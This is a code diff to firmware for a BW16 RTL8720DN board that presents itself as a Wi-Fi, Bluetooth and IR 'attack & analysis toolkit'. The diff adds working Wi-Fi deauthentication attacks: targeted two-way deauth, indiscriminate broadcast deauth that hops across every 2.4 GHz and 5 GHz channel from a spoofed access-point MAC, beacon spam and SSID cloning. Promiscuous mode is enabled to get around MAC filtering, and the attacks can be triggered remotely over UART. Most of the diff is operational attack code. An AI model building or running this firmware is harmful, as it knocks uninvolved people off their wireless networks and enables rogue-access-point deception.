@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────
-//  RAONE  –  BW16 RTL8720DN  Firmware v5.0
+//  RAONE  –  BW16 RTL8720DN  Firmware v7.0
 //  WiFi / Bluetooth / IR attack & analysis toolkit
 //  2-button UI: BTN_OK (TTP223 touch) + BTN_NAV (tactile push)
 //  Long-hold OK (>800 ms) = EMERGENCY BACK (universal, any state)
@@ -23,6 +23,7 @@
 #include "BleSpam.h"
 #include "ClientScanner.h"
 #include "Theme.h"
+#include "UartProtocol.h"
 
 // ─────────────────────────────────────────────────────────────
 //  UI State machine
@@ -55,7 +56,8 @@ enum UiState {
   UI_IR_MENU,
   UI_ACTION_MENU,
   UI_CLIENT_LIST,
-  UI_CLIENT_SCANNING
+  UI_CLIENT_SCANNING,
+  UI_SLAVE_LINKED
 };
 
 // ─────────────────────────────────────────────────────────────
@@ -65,6 +67,8 @@ enum UiState {
 static const char *const MAIN_MENU_ITEMS[] = {
   "Scan Networks",
   "Target / Deauth",
+  "Deauth 5G (All)",
+  "Deauth 2.4G (All)",
   "Beacon Spam",
   "Sniffer",
   "BLE Tools",
@@ -174,11 +178,59 @@ void exitWifiAnalyzer();
 void exitSniffer();
 void startSniffer(uint8_t band);
 
+void telemetryWatchdogTask(const void *arg) {
+  (void)arg;
+  static uint32_t lastReportSeq = 0;
+  static bool reportedFreeze = false;
+
+  while (1) {
+    delay(1000);
+    // Toggle Yellow LED as independent hardware heartbeat for FreeRTOS scheduler liveness
+    digitalWrite(LED_YELLOW, !digitalRead(LED_YELLOW));
+
+    TxProbeSummary summary = txProbeGetSummary();
+    
+    // Emit 1-second Serial heartbeat from safe background thread
+    Serial.print(F("[HEARTBEAT] Up: "));
+    Serial.print(millis() / 1000);
+    Serial.print(F("s | Heap: "));
+    Serial.print((uint32_t)xPortGetFreeHeapSize());
+    Serial.print(F("B | TxCount: "));
+    Serial.print(summary.total_entered);
+    Serial.print(F(" | Stage: "));
+    Serial.println(summary.current_stage);
+
+    if (summary.total_entered > 0) {
+      uint32_t elapsed = millis() - summary.last_activity_ms;
+      if (elapsed >= 1500 && !reportedFreeze && summary.current_stage != TX_STAGE_IDLE) {
+        reportedFreeze = true;
+        Serial.println(F("\n[PROBE WATCHDOG] *** TX FREEZE DETECTED (>1500ms inactivity) ***"));
+        txProbePrintReport();
+      } else if (summary.total_entered != lastReportSeq) {
+        lastReportSeq = summary.total_entered;
+        reportedFreeze = false;
+      }
+    }
+  }
+}
+
 void setup() {
   Serial.begin(115200);
-  delay(50);
+  delay(150);
+
+  Serial.println(F("\n\n=========================================="));
+  Serial.println(F("NICE MCU RTL8720DN DIAGNOSTIC BOOT"));
+  Serial.println(F("=========================================="));
+  Serial.println(F("Serial OK (115200 Baud, LOG_UART PA7/PA8)"));
+  Serial.println(F("Telemetry Initialized"));
+  Serial.println(F("Starting TX diagnostics..."));
+  Serial.println(F("==========================================\n"));
+
+  // Start telemetry watchdog immediately with AboveNormal priority (preempts main task on freeze)
+  os_thread_create_arduino(telemetryWatchdogTask, NULL, OS_PRIORITY_ABOVENORMAL, 2048);
 
   hwBegin();
+  uartProtocolBegin(115200);
   irBegin();
   uiBegin();
 
@@ -191,88 +243,29 @@ void setup() {
   // Start background dual-band WiFi scan immediately
   wifiScannerStartScan();
 
-  // ─── 6-Second Boot Splash Synchronized with Harry Potter Melody ──
-  struct MelodyNote {
-    uint16_t freq;
-    uint16_t dur;
-    uint16_t pause;
-  };
-
-  static const MelodyNote NOTES[] = {
-    { 494, 200, 120 }, // B4
-    { 659, 250, 150 }, // E5
-    { 784, 100,  80 }, // G5
-    { 740, 200, 120 }, // F#5
-    { 659, 400, 200 }, // E5
-    { 988, 200, 120 }, // B5
-    { 880, 400, 200 }, // A5
-    { 740, 400, 200 }, // F#5
-    { 659, 250, 150 }, // E5
-    { 784, 100,  80 }, // G5
-    { 740, 200, 120 }, // F#5
-    { 622, 400, 200 }, // D#5
-    { 698, 200, 120 }, // F5
-    { 494, 400, 250 }, // B4
-    { 440, 200, 120 }, // A4
-    { 494, 250, 200 }, // B4
-    // Second phrase
-    { 494, 200, 120 }, // B4
-    { 659, 250, 150 }, // E5
-    { 784, 100,  80 }, // G5
-    { 740, 200, 120 }, // F#5
-    { 659, 400, 200 }, // E5
-    { 988, 200, 120 }, // B5
-    { 1175, 400, 200 }, // D6
-    { 1109, 200, 120 }, // C#6
-    { 1046, 400, 200 }, // C6
-    { 880, 200, 120 }, // A5
-    { 1046, 250, 150 }, // C6
-    { 988, 100,  80 }, // B5
-    { 932, 200, 120 }, // A#5
-    { 880, 400, 200 }, // A5
-    { 784, 200, 120 }, // G5
-    { 659, 600, 100 }  // E5
-  };
-
-  size_t totalNotes = sizeof(NOTES) / sizeof(NOTES[0]);
-
-  for (size_t i = 0; i < totalNotes; i++) {
-    uint8_t percent = ((i + 1) * 100) / totalNotes;
-    const char *msg = "BOOTING RAONE...";
-    if (percent < 15) {
-      msg = "INIT HARDWARE...";
-      ledRedOn();
-    } else if (percent < 40) {
-      msg = "SCANNING 2.4G & 5G...";
-      ledYellowOn();
-    } else if (percent < 70) {
-      msg = "BUILDING AP MATRIX...";
-      ledGreenOn();
-    } else if (percent < 90) {
-      msg = "CALIBRATING RADIO...";
-      ledYellowOn();
-    } else {
-      msg = "SYSTEM READY!";
-      ledGreenOn();
-    }
-
+  // ─── Ultra-Fast 1.5s Boot Splash ───
+  for (uint8_t i = 0; i < 3; i++) {
+    uint8_t percent = (i + 1) * 33;
+    const char *msg = (i == 0) ? "INIT HARDWARE..." : (i == 1) ? "CALIBRATING RADIO..." : "SYSTEM READY!";
     uiDrawSplashProgress(percent, msg);
-
-    playTone(NOTES[i].freq, NOTES[i].dur);
-    if (NOTES[i].pause > 0) delay(NOTES[i].pause);
+    
+    uartPollCommand();
+    ledStepRGY(i);
+    playTone(1800 + (i * 400), 60);
+    ledAllOff();
+    delay(100);
   }
 
-  // Ensure background scan has finalized
+  // Non-blocking scan check
   bool scanFinished = false;
-  while (!wifiScannerPollScan(&scanFinished)) {
-    delay(40);
-  }
+  wifiScannerPollScan(&scanFinished);
 
   ledAllOff();
-  ledFlashGreen(3, 80);
-  buzzerScanDone();
+  ledCelebrateSync(); // Exact 3x Flash + 3x Beep synchronized together!
   setLedMode(LED_MODE_IDLE);
 
+  // Boot directly into Main Menu with zero hang (Slave mode activates on-demand via UART)
+  setSystemMode(SYS_MODE_STANDALONE);
   drawMainMenu();
 }
 
@@ -281,7 +274,42 @@ void setup() {
 // ─────────────────────────────────────────────────────────────
 
 void loop() {
-  // ── Button reading ──────────────────────────────────────────
+  // ── UART Remote Commands (From TetraX Master) ────────────────
+  UartCommand ucmd = uartPollCommand();
+  if (ucmd.type != UART_CMD_NONE) {
+    if (ucmd.type == UART_CMD_PING) {
+      if (uiState != UI_SLAVE_LINKED) {
+        setSystemMode(SYS_MODE_SLAVE);
+        uiState = UI_SLAVE_LINKED;
+        uiDrawSlaveLinked("TetraX ESP32");
+        buzzerClick();
+      }
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_NAV) {
+      handleNav();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_OK) {
+      handleOk();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BACK || ucmd.type == UART_CMD_STOP) {
+      emergencyBack();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_24) {
+      runDeauthAllChannels(2);
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_5G) {
+      runDeauthAllChannels(5);
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BEACON_24) {
+      if (beaconSpamStart(2)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BEACON_5G) {
+      if (beaconSpamStart(5)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
+      goto after_buttons;
+    }
+  }
+
+  // ── Physical Button reading ──────────────────────────────────
   // OK  = TTP223 touch sensor (PB20, active HIGH)
   //   Short tap  → handleOk()
   //   Long hold  → UNIVERSAL emergency back (handleBack from ANY state)
@@ -443,6 +471,12 @@ void drawBleMenu() {
 // ─────────────────────────────────────────────────────────────
 
 void handleNav() {
+  if (uiState == UI_SLAVE_LINKED) {
+    drawMainMenu();
+    delay(150);
+    return;
+  }
+
   if (uiState == UI_MAIN_MENU) {
     mainMenuIndex = nextIndex(mainMenuIndex, MAIN_MENU_COUNT);
     drawMainMenu();
@@ -538,6 +572,12 @@ void handleNav() {
 // ─────────────────────────────────────────────────────────────
 
 void handleOk() {
+  if (uiState == UI_SLAVE_LINKED) {
+    drawMainMenu();
+    delay(150);
+    return;
+  }
+
   if (uiState == UI_MAIN_MENU) { openMainMenuItem(); return; }
   if (uiState == UI_BLE_MENU)  { openBleMenuItem();  return; }
 
@@ -624,6 +664,7 @@ void handleOk() {
   }
 
   if (uiState == UI_BAND_MENU) {
+    uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
     if (beaconSpamStart(selectedBand)) {
       uiState = UI_BEACON_SPAM;
       uiDrawBeaconSpam();
@@ -635,12 +676,16 @@ void handleOk() {
   }
 
   if (uiState == UI_NETWORK_LIST) {
-    if (selectedNetwork >= (int)wifiScannerCount() || selectedNetwork < 0) {
+    if (selectedNetwork == 0) {
+      runScan();
+      return;
+    }
+    if (selectedNetwork > (int)wifiScannerCount() || selectedNetwork < 0) {
       drawMainMenu();
       delay(200);
       return;
     }
-    actionNetworkIdx = selectedNetwork;
+    actionNetworkIdx = selectedNetwork - 1;
     actionMenuIndex = 0;
     uiState = UI_ACTION_MENU;
     uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
@@ -665,6 +710,7 @@ void handleOk() {
     }
     else if (actionMenuIndex == 2) {
       // Clone & Beacon
+      uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
       beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
       uint8_t band = wifiScannerIs5GHz(wifiScannerNetwork(actionNetworkIdx).channel) ? 5 : 2;
       if (beaconSpamStart(band)) {
@@ -719,6 +765,11 @@ void handleOk() {
 // ─────────────────────────────────────────────────────────────
 
 void handleBack() {
+  if (uiState == UI_MAIN_MENU && getSystemMode() == SYS_MODE_SLAVE) {
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    return;
+  }
   if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
   if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
   if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
@@ -770,8 +821,14 @@ void emergencyBack() {
   delay(60);
   buzzerBeep(1000, 80);
   
-  // Always go back to main menu
-  drawMainMenu();
+  if (getSystemMode() == SYS_MODE_SLAVE) {
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    uartSendStatus("IDLE");
+  } else {
+    // Always go back to main menu
+    drawMainMenu();
+  }
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -807,26 +864,34 @@ void openMainMenuItem() {
       }
       break;
     case 2:
+      // Deauth 5G (All Channels)
+      runDeauthAllChannels(5);
+      break;
+    case 3:
+      // Deauth 2.4G (All Channels)
+      runDeauthAllChannels(2);
+      break;
+    case 4:
       // Beacon Spam
       selectedBand = 2;
       uiState = UI_BAND_MENU;
       uiDrawBandMenu(selectedBand);
       break;
-    case 3:
+    case 5:
       // Sniffer
       startSniffer(2);
       break;
-    case 4:
+    case 6:
       // BLE Tools
       drawBleMenu();
       break;
-    case 5:
+    case 7:
       // IR Remote
       uiState = UI_IR_MENU;
       irMenuIndex = 0;
       uiDrawIrMenu(irMenuIndex);
       break;
-    case 6: {
+    case 8: {
       // System Info
       uiState = UI_SYSTEM_INFO;
       uint8_t c24 = wifiScannerCountBand(2);
@@ -952,55 +1017,102 @@ bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
     return false;
   }
 
+  // Draw activating screen
+  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
+  ledFlashGreen(1, 100);
+
+  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+  wifi_set_channel(target.channel);
+  delay(80);
+
+  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
+  // Without this, the MAC refuses to transmit raw frames on 5GHz, filling the queue until the CPU crashes.
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
   // Draw full deauth attack screen with live counter
   uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);
 
-  wifi_on(RTW_MODE_STA);
-  wifi_change_channel_plan(0x25);
-  wifi_set_channel(target.channel);
-
   bool anySent = false;
   uint32_t sentCount = 0;
-  uint32_t lastUiUpdate = 0;
+  uint32_t failCount = 0;
+  uint32_t lastUiUpdate = millis();
+  uint32_t lastPpsCalc = millis();
+  uint32_t lastSentForPps = 0;
+  uint16_t currentPps = 0;
   uint32_t lastBuzzer = 0;
 
   uint8_t dstMacBuf[6];
   memcpy(dstMacBuf, dstMac, 6);
+
+  txProbeReset();
 
   while (true) {
     if (anyButtonPressed()) {
       return stopPacketInjectionLab(anySent, sentCount);
     }
 
+    UartCommand cmd = uartPollCommand();
+    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
     for (uint8_t burst = 0; burst < 10; burst++) {
       if (anyButtonPressed()) {
         return stopPacketInjectionLab(anySent, sentCount);
       }
 
-      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
-      if (sent) {
+      bool sent1 = wifi_tx_deauth_frame(targetMac, dstMacBuf, targetMac, LAB_DEAUTH_REASON);
+      if (sent1) {
         anySent = true;
         sentCount++;
-        ledFlashGreen(1, 5);
+        ledGreenOn();
       } else {
-        ledFlashRed(1, 5);
+        failCount++;
+        delay(20);
       }
+      delay(15);
 
-      delay(5);
-      yield();
+      bool sent2 = wifi_tx_deauth_frame(dstMacBuf, targetMac, targetMac, LAB_DEAUTH_REASON);
+      if (sent2) {
+        anySent = true;
+        sentCount++;
+        ledGreenOff();
+      } else {
+        failCount++;
+        delay(20);
+      }
+      delay(15);
+    }
+    ledGreenOff();
+
+    // CRITICAL FIX: Explicit DMA flush yield.
+    delay(100);
+
+    if (millis() - lastPpsCalc >= 1000) {
+      currentPps = (uint16_t)(sentCount - lastSentForPps);
+      lastSentForPps = sentCount;
+      lastPpsCalc = millis();
     }
 
-    if (millis() - lastUiUpdate > 60) {
+    if (millis() - lastUiUpdate > 80) {
       lastUiUpdate = millis();
-      uiRefreshDeauthCounter(sentCount);
+      uiRefreshDeauthLive(target.channel, sentCount, failCount, currentPps, false, target.ssid);
+      uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
     }
 
-    if (sentCount - lastBuzzer >= 40) {
+    if (sentCount - lastBuzzer >= 30) {
       lastBuzzer = sentCount;
       buzzerClick();
     }
 
-    delay(10);
+    delay(20);
     yield();
   }
 }
@@ -1025,61 +1137,200 @@ bool runPacketInjectionLab() {
     return false;
   }
 
+  // Draw activating screen
+  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
+  ledFlashGreen(1, 100);
+
+  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+  wifi_set_channel(target.channel);
+  delay(80);
+
+  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
   // Draw full deauth attack screen with live counter
   uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);
 
-  wifi_on(RTW_MODE_STA);
-  wifi_change_channel_plan(0x25);
-  wifi_set_channel(target.channel);
-
   bool anySent = false;
   uint32_t sentCount = 0;
-  uint32_t lastUiUpdate = 0;
+  uint32_t failCount = 0;
+  uint32_t lastUiUpdate = millis();
+  uint32_t lastPpsCalc = millis();
+  uint32_t lastSentForPps = 0;
+  uint16_t currentPps = 0;
   uint32_t lastBuzzer = 0;
+
+  txProbeReset();
 
   while (true) {
     if (anyButtonPressed()) {
       return stopPacketInjectionLab(anySent, sentCount);
     }
 
-    for (uint8_t burst = 0; burst < 10; burst++) {
+    UartCommand cmd = uartPollCommand();
+    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
+    for (uint8_t burst = 0; burst < 20; burst++) {
       if (anyButtonPressed()) {
         return stopPacketInjectionLab(anySent, sentCount);
       }
 
-      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
+      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, targetMac, LAB_DEAUTH_REASON);
       if (sent) {
         anySent = true;
         sentCount++;
-        ledFlashGreen(1, 5);
+        ledGreenOn();
       } else {
-        ledFlashRed(1, 5);
+        failCount++;
+        delay(20);
       }
 
-      delay(5);
-      yield();
+      delay(15);
+    }
+    ledGreenOff();
+
+    // CRITICAL FIX: Explicit DMA flush yield.
+    delay(100);
+
+    if (millis() - lastPpsCalc >= 1000) {
+      currentPps = (uint16_t)(sentCount - lastSentForPps);
+      lastSentForPps = sentCount;
+      lastPpsCalc = millis();
     }
 
-    if (millis() - lastUiUpdate > 60) {
+    if (millis() - lastUiUpdate > 80) {
       lastUiUpdate = millis();
-      uiRefreshDeauthCounter(sentCount);
+      uiRefreshDeauthLive(target.channel, sentCount, failCount, currentPps, false, target.ssid);
+      uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
     }
 
-    if (sentCount - lastBuzzer >= 40) {
+    if (sentCount - lastBuzzer >= 30) {
       lastBuzzer = sentCount;
       buzzerClick();
     }
 
-    delay(10);
+    delay(20);
     yield();
+  }
+}
+
+bool runDeauthAllChannels(uint8_t band) {
+  static const uint8_t CHANNELS_24[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
+  static const uint8_t CHANNELS_5[]  = { 36, 40, 44, 48, 149, 153, 157, 161 };
+
+  uint8_t count = (band == 5) ? (uint8_t)(sizeof(CHANNELS_5) / sizeof(CHANNELS_5[0])) : (uint8_t)(sizeof(CHANNELS_24) / sizeof(CHANNELS_24[0]));
+  const uint8_t *chList = (band == 5) ? CHANNELS_5 : CHANNELS_24;
+
+  uiDrawGenericMessage("ALL-CH ATTACK", band == 5 ? "5GHz All Channels" : "2.4GHz All Channels", "Activating Mode...");
+  ledFlashGreen(1, 100);
+
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+
+  // Enable Promiscuous Mode to bypass MAC filtering
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
+  bool anySent = false;
+  uint32_t sentCount = 0;
+  uint32_t failCount = 0;
+  uint32_t lastUiUpdate = millis();
+  uint32_t lastPpsCalc = millis();
+  uint32_t lastSentForPps = 0;
+  uint16_t currentPps = 0;
+  uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+  uint8_t fakeApMac[6]    = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };
+
+  uiDrawDeauthScreen(band == 5 ? "ALL 5G CHANNELS" : "ALL 2.4G CHANNELS", chList[0], band == 5, 0);
+
+  uint8_t chIndex = 0;
+
+  while (true) {
+    if (anyButtonPressed()) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    UartCommand cmd = uartPollCommand();
+    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    uint8_t curCh = chList[chIndex];
+    wifi_set_channel(curCh);
+    delay(20);
+
+    // Burst on current channel
+    for (uint8_t burst = 0; burst < 10; burst++) {
+      if (anyButtonPressed()) return stopPacketInjectionLab(anySent, sentCount);
+
+      bool sent = wifi_tx_deauth_frame(fakeApMac, broadcastMac, fakeApMac, LAB_DEAUTH_REASON);
+      if (sent) {
+        anySent = true;
+        sentCount++;
+        ledGreenOn();
+      } else {
+        failCount++;
+        delay(15);
+      }
+      delay(10);
+    }
+    ledGreenOff();
+
+    // DMA flush yield
+    delay(50);
+
+    if (millis() - lastPpsCalc >= 1000) {
+      currentPps = (uint16_t)(sentCount - lastSentForPps);
+      lastSentForPps = sentCount;
+      lastPpsCalc = millis();
+    }
+
+    if (millis() - lastUiUpdate > 80) {
+      lastUiUpdate = millis();
+      // Pass 0 as channel to indicate Hopping mode to both local UI and Master
+      uiRefreshDeauthLive(0, sentCount, failCount, currentPps, true, band == 5 ? "ALL 5G" : "ALL 2.4G");
+      uartSendLiveStats(0, sentCount, failCount, currentPps);
+    }
+
+    chIndex = (chIndex + 1) % count;
   }
 }
 
 bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
   labInjectionStoppedByUser = true;
+  ledAllOff();
   uiDrawStatus("Stopped");
   buzzerClick();
-  delay(300);
+
+  // Print in-memory telemetry probe log upon stop
+  txProbePrintReport();
+  
+  // Clean radio restore
+  wifi_set_promisc(0, NULL, 0);
+  wifi_off();
+  delay(100);
+  wifi_on(RTW_MODE_STA);
+  wifi_change_channel_plan(0x7F);
+  delay(150);
+
+  if (getSystemMode() == SYS_MODE_SLAVE) {
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    uartSendStatus("STOPPED", sentCount);
+  }
+
   waitForLabButtonsReleased();
   return anySent;
 }
@@ -1196,12 +1447,10 @@ void showPlaceholder(const char *title, const char *message) {
 
 void runScan() {
   setLedMode(LED_MODE_SCANNING);
-  uiDrawStatus("Scanning...");
-
   selectedNetwork = 0;
   listTop = 0;
 
-  if (!wifiScannerScan()) {
+  if (!wifiScannerStartScan()) {
     setLedMode(LED_MODE_IDLE);
     ledFlashRed(2, 100);
     buzzerError();
@@ -1211,11 +1460,74 @@ void runScan() {
     return;
   }
 
-  // Scan end: 3 green blink
+  // 5-Second Scan Melody (Mission Impossible / Cyber Scan Chiptune)
+  struct ScanNote {
+    uint16_t freq;
+    uint16_t dur;
+    uint16_t pause;
+  };
+
+  static const ScanNote SCAN_MELODY[] = {
+    { 392,  90, 40 }, // G4
+    { 392,  90, 40 }, // G4
+    { 466, 120, 40 }, // Bb4
+    { 523, 120, 40 }, // C5
+    { 392,  90, 40 }, // G4
+    { 392,  90, 40 }, // G4
+    { 349, 120, 40 }, // F4
+    { 370, 120, 40 }, // F#4
+    { 392,  90, 40 }, // G4
+    { 392,  90, 40 }, // G4
+    { 466, 120, 40 }, // Bb4
+    { 523, 120, 40 }, // C5
+    { 392,  90, 40 }, // G4
+    { 392,  90, 40 }, // G4
+    { 349, 120, 40 }, // F4
+    { 370, 120, 40 }, // F#4
+    { 466, 180, 50 }, // Bb4
+    { 440, 180, 50 }, // A4
+    { 392, 280, 60 }, // G4
+    { 587, 180, 50 }, // D5
+    { 523, 180, 50 }, // C5
+    { 466, 180, 50 }, // Bb4
+    { 392, 350, 50 }  // G4
+  };
+  const size_t noteCount = sizeof(SCAN_MELODY) / sizeof(SCAN_MELODY[0]);
+
+  uint32_t scanStartTime = millis();
+  uint8_t noteIndex = 0;
+  uint8_t animFrame = 0;
+
+  while (millis() - scanStartTime < 5000) {
+    uint32_t elapsed = millis() - scanStartTime;
+    uint8_t remaining = (elapsed < 5000) ? (5 - (elapsed / 1000)) : 1;
+
+    // Draw scanning animation with dynamic countdown and AP blips
+    uiDrawScanCountdown(remaining, elapsed, wifiScannerCount(), animFrame);
+    animFrame++;
+
+    // Play next note of the scan melody synchronized with LEDs
+    if (noteIndex < noteCount) {
+      ledStepRGY(noteIndex);
+      playTone(SCAN_MELODY[noteIndex].freq, SCAN_MELODY[noteIndex].dur);
+      ledAllOff();
+      if (SCAN_MELODY[noteIndex].pause > 0) {
+        delay(SCAN_MELODY[noteIndex].pause);
+      }
+      noteIndex++;
+    } else {
+      delay(40);
+    }
+  }
+
+  // Finalize scan result
+  bool scanOk = false;
+  wifiScannerPollScan(&scanOk);
+
+  // Scan completed celebration
   ledAllOff();
-  ledFlashGreen(3, 100);
+  ledFlashGreen(3, 80);
   setLedMode(LED_MODE_IDLE);
-  
   buzzerScanDone();
 
   selectedNetwork = 0;
@@ -1243,12 +1555,11 @@ uint8_t nextBandOption(uint8_t current) {
 void moveSelectionAll(int delta) {
   int total = (int)wifiScannerCount();
   if (total == 0) {
-    uiDrawStatus("Scanning...");
     runScan();
     return;
   }
 
-  int itemCount = total + 1; // +1 for [ Back ]
+  int itemCount = total + 2; // +1 for [ RE-SCAN ], +1 for [ Back ]
 
   if (delta > 0) {
     selectedNetwork = (selectedNetwork + 1) % itemCount;
